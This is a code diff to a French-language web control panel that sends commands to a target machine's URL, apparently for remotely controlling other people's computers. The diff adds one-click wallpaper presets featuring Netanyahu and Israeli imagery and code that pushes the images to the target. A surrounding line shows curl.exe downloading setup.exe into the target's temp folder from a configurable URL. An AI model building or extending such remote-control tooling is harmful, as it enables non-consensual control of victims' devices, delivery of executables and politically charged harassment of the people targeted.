@@ -362,14 +362,23 @@
         <div><div class="card-title">Fond d'ecran</div><div class="card-desc">Remplace le wallpaper</div></div>
       </div>
       <div class="field">
-        <label>Image (JPG, PNG, BMP)</label>
-        <label class="file-label" for="wallpaperFile">
-          📁 Choisir une image
-          <input type="file" id="wallpaperFile" accept="image/*" />
-        </label>
-        <span class="file-name" id="wallpaperName">Aucun fichier</span>
+        <label>Wallpapers rapides</label>
+        <div style="display:flex;flex-wrap:wrap;gap:.4rem">
+          <button class="btn" style="font-size:.78rem;padding:.4rem .75rem;margin-top:0" onclick="sendWallpaperPreset('benjamin-netanyahu.jpg')">🇮🇱 Netanyahu</button>
+          <button class="btn" style="font-size:.78rem;padding:.4rem .75rem;margin-top:0" onclick="sendWallpaperPreset('israel.jpg')">✡️ Israel</button>
+        </div>
       </div>
-      <button class="btn" onclick="sendWallpaper()">Envoyer</button>
+      <div style="border-top:1px solid var(--border);padding-top:.75rem;display:flex;flex-direction:column;gap:.6rem">
+        <div class="field">
+          <label>Image personnalisee (JPG, PNG, BMP)</label>
+          <label class="file-label" for="wallpaperFile">
+            📁 Choisir une image
+            <input type="file" id="wallpaperFile" accept="image/*" />
+          </label>
+          <span class="file-name" id="wallpaperName">Aucun fichier</span>
+        </div>
+        <button class="btn" onclick="sendWallpaper()">Envoyer</button>
+      </div>
     </div>
 
     <div class="card">
@@ -599,6 +608,25 @@ curl.exe -sLo "%TEMP%\\setup.exe" "${SETUP_URL}"
     if (!file) { toast('Choisis une image d\'abord.', 'err'); return; }
     const fd = new FormData(); fd.append('image', file);
     post('/wallpaper', fd, true);
+  }
+
+  async function sendWallpaperPreset(filename) {
+    const url = getTarget();
+    if (!url) { toast("Entre d'abord l'URL de la cible !", 'err'); return; }
+    toast('Chargement…');
+    try {
+      const resp = await fetch('./wallpaper/' + encodeURIComponent(filename));
+      if (!resp.ok) throw new Error();
+      const blob = await resp.blob();
+      const fd = new FormData();
+      fd.append('image', blob, filename);
+      const r    = await fetch(url + '/wallpaper', { method: 'POST', body: fd });
+      const json = await r.json();
+      if (r.ok) toast('OK !');
+      else toast('Erreur : ' + (json.error || r.status), 'err');
+    } catch {
+      toast('Impossible de joindre la cible.', 'err');
+    }
   }
 
   function sendAudio() {
